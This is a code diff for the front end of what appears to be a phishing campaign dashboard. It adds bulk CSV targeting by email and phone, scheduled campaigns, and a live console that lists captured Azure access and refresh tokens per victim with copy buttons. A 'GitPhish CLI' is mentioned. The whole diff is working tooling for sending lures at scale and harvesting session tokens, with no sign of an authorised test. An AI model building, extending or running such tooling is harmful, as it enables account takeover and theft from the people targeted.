@@ -50,12 +50,13 @@
                                     <th>Targets</th>
                                     <th>Status</th>
                                     <th>Started</th>
+                                    <th>Type</th>
                                     <th>Actions</th>
                                 </tr>
                             </thead>
                             <tbody id="campaignsTableBody">
                                 <tr>
-                                    <td colspan="7" class="text-center text-muted py-4">
+                                    <td colspan="8" class="text-center text-muted py-4">
                                         <i class="fas fa-inbox fa-2x mb-2"></i>
                                         <div>No campaigns yet. Create your first Azure campaign above.</div>
                                     </td>
@@ -203,12 +204,18 @@
                                     <div id="fileTargetInputs" class="d-none">
                                         <div class="form-group mb-3">
                                             <label class="form-label">Target File (CSV)</label>
-                                            <input type="file" class="form-control" id="targetFile" accept=".csv,.txt">
+                                            <input type="file" class="form-control" id="targetFile" accept=".csv,.txt" onchange="validateCSV()">
                                             <div class="form-text">Format: email,phone (one per line)</div>
+                                            <div id="csvValidationResult" class="mt-2"></div>
                                         </div>
-                                        <button type="button" class="btn btn-sm btn-outline-info" onclick="showUploadModal()">
-                                            <i class="fas fa-upload me-1"></i>Upload File
-                                        </button>
+                                        <div class="d-flex gap-2">
+                                            <button type="button" class="btn btn-sm btn-outline-info" onclick="validateCSV()">
+                                                <i class="fas fa-check me-1"></i>Validate CSV
+                                            </button>
+                                            <button type="button" class="btn btn-sm btn-outline-secondary" onclick="showUploadModal()">
+                                                <i class="fas fa-upload me-1"></i>Upload File
+                                            </button>
+                                        </div>
                                     </div>
                                 </div>
                             </div>
@@ -659,6 +666,89 @@ function generateEncryptionKey() {
     document.getElementById('encryptionKey').value = key;
 }
 
+function validateCSV() {
+    const fileInput = document.getElementById('targetFile');
+    const resultDiv = document.getElementById('csvValidationResult');
+    
+    if (!fileInput.files.length) {
+        resultDiv.innerHTML = '<div class="alert alert-warning"><i class="fas fa-exclamation-triangle me-2"></i>Please select a CSV file first</div>';
+        return;
+    }
+    
+    const file = fileInput.files[0];
+    const reader = new FileReader();
+    
+    reader.onload = function(e) {
+        try {
+            const content = e.target.result;
+            const lines = content.trim().split('\n');
+            
+            let validCount = 0;
+            let invalidLines = [];
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            const phoneRegex = /^\+?[1-9]\d{1,14}$/;
+            
+            lines.forEach((line, index) => {
+                const trimmedLine = line.trim();
+                if (trimmedLine === '') return; // Skip empty lines
+                
+                const parts = trimmedLine.split(',');
+                if (parts.length !== 2) {
+                    invalidLines.push(`Line ${index + 1}: Must have exactly 2 columns (email,phone) - got ${parts.length}`);
+                    return;
+                }
+                
+                const email = parts[0].trim();
+                const phone = parts[1].trim();
+                
+                if (!emailRegex.test(email)) {
+                    invalidLines.push(`Line ${index + 1}: Invalid email format: "${email}"`);
+                    return;
+                }
+                
+                if (!phoneRegex.test(phone)) {
+                    invalidLines.push(`Line ${index + 1}: Invalid phone format: "${phone}" (should be +1234567890)`);
+                    return;
+                }
+                
+                validCount++;
+            });
+            
+            if (invalidLines.length === 0) {
+                resultDiv.innerHTML = `
+                    <div class="alert alert-success">
+                        <i class="fas fa-check-circle me-2"></i>
+                        <strong>CSV Valid!</strong> Found ${validCount} valid targets.
+                    </div>
+                `;
+            } else {
+                resultDiv.innerHTML = `
+                    <div class="alert alert-danger">
+                        <i class="fas fa-exclamation-circle me-2"></i>
+                        <strong>CSV Validation Failed</strong><br>
+                        Valid entries: ${validCount}<br>
+                        <details class="mt-2">
+                            <summary>Show ${invalidLines.length} errors</summary>
+                            <ul class="mt-2 mb-0">
+                                ${invalidLines.map(error => `<li>${error}</li>`).join('')}
+                            </ul>
+                        </details>
+                    </div>
+                `;
+            }
+        } catch (error) {
+            resultDiv.innerHTML = `
+                <div class="alert alert-danger">
+                    <i class="fas fa-exclamation-circle me-2"></i>
+                    <strong>Error reading file:</strong> ${error.message}
+                </div>
+            `;
+        }
+    };
+    
+    reader.readAsText(file);
+}
+
 function testTwilioConfig() {
     const data = {
         sid: document.getElementById('twilioSid').value,
@@ -906,11 +996,38 @@ function scheduleCampaign() {
         return;
     }
     
-    if (formData.targetMethod === 'single' && (!formData.targetEmail || !formData.targetPhone)) {
-        alert('❌ Target email and phone are required');
-        return;
+    // Handle different target methods
+    if (formData.targetMethod === 'single') {
+        if (!formData.targetEmail || !formData.targetPhone) {
+            alert('❌ Target email and phone are required');
+            return;
+        }
+        // Send the request for single target
+        sendScheduleCampaignRequest(formData);
+    } else if (formData.targetMethod === 'file') {
+        const fileInput = document.getElementById('targetFile');
+        if (!fileInput.files.length) {
+            alert('❌ Please select a CSV file');
+            return;
+        }
+        
+        // Read CSV file content
+        const file = fileInput.files[0];
+        const reader = new FileReader();
+        
+        reader.onload = function(e) {
+            formData.csvContent = e.target.result;
+            
+            // Send the request with CSV content
+            sendScheduleCampaignRequest(formData);
+        };
+        
+        reader.readAsText(file);
+        return; // Exit here, sendScheduleCampaignRequest will be called after file is read
     }
-    
+}
+
+function sendScheduleCampaignRequest(formData) {
     fetch('/api/azure-campaigns/schedule', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
@@ -919,7 +1036,10 @@ function scheduleCampaign() {
     .then(response => response.json())
     .then(data => {
         if (data.success) {
-            alert(`✅ Campaign scheduled successfully for ${scheduledDateTime.toLocaleString()}!`);
+            const message = formData.targetMethod === 'file' ? 
+                `✅ Batch campaign scheduled with ${data.target_count || 'multiple'} targets!` :
+                '✅ Campaign scheduled successfully!';
+            alert(message);
             bootstrap.Modal.getInstance(document.getElementById('campaignModal')).hide();
             // Optionally refresh scheduled campaigns if modal is open
         } else {
@@ -963,11 +1083,39 @@ function startCampaign() {
         return;
     }
     
-    if (formData.targetMethod === 'single' && (!formData.targetEmail || !formData.targetPhone)) {
-        alert('❌ Target email and phone are required');
-        return;
+    // Handle different target methods
+    if (formData.targetMethod === 'single') {
+        if (!formData.targetEmail || !formData.targetPhone) {
+            alert('❌ Target email and phone are required');
+            return;
+        }
+    } else if (formData.targetMethod === 'file') {
+        const fileInput = document.getElementById('targetFile');
+        if (!fileInput.files.length) {
+            alert('❌ Please select a CSV file');
+            return;
+        }
+        
+        // Read CSV file content
+        const file = fileInput.files[0];
+        const reader = new FileReader();
+        
+        reader.onload = function(e) {
+            formData.csvContent = e.target.result;
+            
+            // Send the request with CSV content
+            sendCampaignRequest(formData);
+        };
+        
+        reader.readAsText(file);
+        return; // Exit here, sendCampaignRequest will be called after file is read
     }
     
+    // Send the request for single target
+    sendCampaignRequest(formData);
+}
+
+function sendCampaignRequest(formData) {
     fetch('/api/azure-campaigns/start', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
@@ -976,7 +1124,10 @@ function startCampaign() {
     .then(response => response.json())
     .then(data => {
         if (data.success) {
-            alert('✅ Campaign started successfully!');
+            const message = formData.targetMethod === 'file' ? 
+                `✅ Batch campaign started with ${data.target_count} targets!` :
+                '✅ Campaign started successfully!';
+            alert(message);
             bootstrap.Modal.getInstance(document.getElementById('campaignModal')).hide();
             refreshCampaigns();
         } else {
@@ -997,6 +1148,26 @@ function viewCampaign(campaignId) {
     // Start live updates
     refreshLiveConsole();
     liveUpdateInterval = setInterval(refreshLiveConsole, 3000);
+    
+    // Stop updates when modal is closed
+    document.getElementById('liveConsoleModal').addEventListener('hidden.bs.modal', function() {
+        if (liveUpdateInterval) {
+            clearInterval(liveUpdateInterval);
+            liveUpdateInterval = null;
+        }
+    });
+}
+
+function viewScheduledCampaignDashboard(jobId, campaignId) {
+    // For scheduled campaigns, we need to use a special endpoint that gets job data
+    currentCampaignId = `scheduled_${jobId}`;
+    
+    // Show live console modal
+    new bootstrap.Modal(document.getElementById('liveConsoleModal')).show();
+    
+    // Start live updates for scheduled campaign
+    refreshScheduledCampaignConsole(jobId);
+    liveUpdateInterval = setInterval(() => refreshScheduledCampaignConsole(jobId), 3000);
     
     // Stop updates when modal is closed
     document.getElementById('liveConsoleModal').addEventListener('hidden.bs.modal', function() {
@@ -1072,6 +1243,115 @@ function refreshLiveConsole() {
     })
     .catch(error => {
         console.error('Error refreshing live console:', error);
+    });
+}
+
+function refreshScheduledCampaignConsole(jobId) {
+    if (!jobId) return;
+    
+    // Get job details and build console data from scheduled job
+    fetch(`/api/azure-campaigns/scheduled/${jobId}/status`)
+    .then(response => response.json())
+    .then(data => {
+        if (data.success && data.job) {
+            const job = data.job;
+            
+            // Update stats based on job data
+            document.getElementById('liveStatus').textContent = job.status;
+            document.getElementById('liveSmsSent').textContent = (job.status === 'completed' || job.status === 'token received') ? '1' : '0';
+            
+            // Get tokens for this job
+            const campaign_id = job.campaign_id || `scheduled_${jobId}`;
+            
+            // Find tokens by looking for azure token files that match the target email
+            fetch('/api/azure-campaigns/logs/scheduled_tokens', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    job_name: job.job_name,
+                    target_email: job.job_data.targetEmail,
+                    campaign_id: campaign_id
+                })
+            })
+            .then(response => response.json())
+            .then(tokenData => {
+                if (tokenData.success) {
+                    const tokens = tokenData.tokens;
+                    document.getElementById('liveTokensCaptured').textContent = tokens.length;
+                    
+                    // Update tokens list
+                    const tokensList = document.getElementById('capturedTokensList');
+                    if (tokens && tokens.length > 0) {
+                        tokensList.innerHTML = '';
+                        tokens.forEach(token => {
+                            const tokenDiv = document.createElement('div');
+                            tokenDiv.className = 'alert alert-success mb-3';
+                            tokenDiv.innerHTML = `
+                                <div class="d-flex justify-content-between align-items-start">
+                                    <div>
+                                        <strong><i class="fas fa-user me-2"></i>${token.email}</strong><br>
+                                        <small><i class="fas fa-clock me-1"></i>Captured: ${new Date(token.captured_at * 1000).toLocaleString()}</small><br>
+                                        <small><i class="fas fa-shield-alt me-1"></i>Token Type: ${token.token_type}</small><br>
+                                        <small><i class="fas fa-key me-1"></i>Scope: ${token.scope || 'Default'}</small><br>
+                                        <small><i class="fas fa-hourglass-half me-1"></i>Expires In: ${token.expires_in} seconds</small>
+                                    </div>
+                                    <div class="flex-shrink-0" style="width: 60%;">
+                                        <div class="mb-2">
+                                            <label class="form-label small"><strong>Access Token:</strong></label>
+                                            <div class="input-group input-group-sm">
+                                                <input type="text" class="form-control bg-dark text-light font-monospace" value="${token.access_token}" readonly>
+                                                <button class="btn btn-outline-light" type="button" onclick="copyToClipboard('${token.access_token}')">
+                                                    <i class="fas fa-copy"></i>
+                                                </button>
+                                            </div>
+                                        </div>
+                                        ${token.refresh_token && token.refresh_token !== 'N/A' ? `
+                                        <div class="mb-2">
+                                            <label class="form-label small"><strong>Refresh Token:</strong></label>
+                                            <div class="input-group input-group-sm">
+                                                <input type="text" class="form-control bg-dark text-light font-monospace" value="${token.refresh_token}" readonly>
+                                                <button class="btn btn-outline-light" type="button" onclick="copyToClipboard('${token.refresh_token}')">
+                                                    <i class="fas fa-copy"></i>
+                                                </button>
+                                            </div>
+                                        </div>
+                                        ` : ''}
+                                    </div>
+                                </div>
+                            `;
+                            tokensList.appendChild(tokenDiv);
+                        });
+                    }
+                }
+            })
+            .catch(error => console.error('Error getting scheduled tokens:', error));
+            
+            // Update console output with job result data
+            let output = 'No output yet...';
+            if (job.result_data) {
+                // For scheduled campaigns, don't show stderr as it contains help text, not real errors
+                output = job.result_data.stdout || 'Campaign executed successfully.';
+                
+                // Don't show stderr for scheduled jobs since GitPhish CLI shows help text there
+            }
+            
+            document.getElementById('liveConsoleOutput').textContent = output;
+            
+            // Calculate runtime
+            if (job.executed_at && job.created_at) {
+                const start = new Date(job.created_at);
+                const end = new Date(job.executed_at);
+                const runtime = Math.floor((end - start) / 1000);
+                document.getElementById('liveRuntime').textContent = `${runtime}s`;
+            } else {
+                document.getElementById('liveRuntime').textContent = 'N/A';
+            }
+        } else {
+            console.error('Error getting scheduled job data:', data.error);
+        }
+    })
+    .catch(error => {
+        console.error('Error refreshing scheduled campaign console:', error);
     });
 }
 
@@ -1169,23 +1449,50 @@ function refreshCampaigns() {
                     <td>${campaign.provider}</td>
                     <td>${campaign.target_count}</td>
                     <td><span class="badge bg-${getStatusBadgeClass(campaign.status)}">${campaign.status}</span></td>
-                    <td>${new Date(campaign.started).toLocaleString()}</td>
+                    <td>${campaign.started ? new Date(campaign.started).toLocaleString() : 'N/A'}</td>
                     <td>
-                        <button class="btn btn-sm btn-outline-info" onclick="viewCampaign('${campaign.id}')">
-                            <i class="fas fa-eye"></i> View
-                        </button>
-                        ${campaign.status === 'running' ? `
-                            <button class="btn btn-sm btn-outline-danger" onclick="stopCampaign('${campaign.id}')">
-                                <i class="fas fa-stop"></i>
+                        ${campaign.scheduled ? `
+                            <span class="badge bg-info"><i class="fas fa-clock me-1"></i>Scheduled</span>
+                        ` : `
+                            <span class="badge bg-primary"><i class="fas fa-play me-1"></i>Immediate</span>
+                        `}
+                    </td>
+                    <td>
+                        ${campaign.scheduled && campaign.status === 'pending' ? `
+                            <button class="btn btn-sm btn-outline-danger" onclick="cancelScheduledCampaign(${campaign.job_id})">
+                                <i class="fas fa-times"></i> Cancel
                             </button>
-                        ` : ''}
+                            <button class="btn btn-sm btn-outline-info" onclick="viewJobDetails(${campaign.job_id})">
+                                <i class="fas fa-eye"></i> Details
+                            </button>
+                        ` : campaign.scheduled && (campaign.campaign_id || campaign.status === 'token received') ? `
+                            <button class="btn btn-sm btn-outline-info" onclick="viewScheduledCampaignDashboard(${campaign.job_id}, '${campaign.campaign_id || 'scheduled_' + campaign.job_id}')">
+                                <i class="fas fa-eye"></i> Dashboard
+                            </button>
+                            <button class="btn btn-sm btn-outline-secondary" onclick="viewJobDetails(${campaign.job_id})">
+                                <i class="fas fa-cog"></i> Job Info
+                            </button>
+                        ` : campaign.scheduled ? `
+                            <button class="btn btn-sm btn-outline-info" onclick="viewJobDetails(${campaign.job_id})">
+                                <i class="fas fa-eye"></i> Details  
+                            </button>
+                        ` : `
+                            <button class="btn btn-sm btn-outline-info" onclick="viewCampaign('${campaign.id}')">
+                                <i class="fas fa-eye"></i> View
+                            </button>
+                            ${campaign.status === 'running' ? `
+                                <button class="btn btn-sm btn-outline-danger" onclick="stopCampaign('${campaign.id}')">
+                                    <i class="fas fa-stop"></i>
+                                </button>
+                            ` : ''}
+                        `}
                     </td>
                 </tr>
             `).join('');
         } else {
             tbody.innerHTML = `
                 <tr>
-                    <td colspan="7" class="text-center text-muted py-4">
+                    <td colspan="8" class="text-center text-muted py-4">
                         <i class="fas fa-inbox fa-2x mb-2"></i>
                         <div>No campaigns yet. Create your first Azure campaign above.</div>
                     </td>
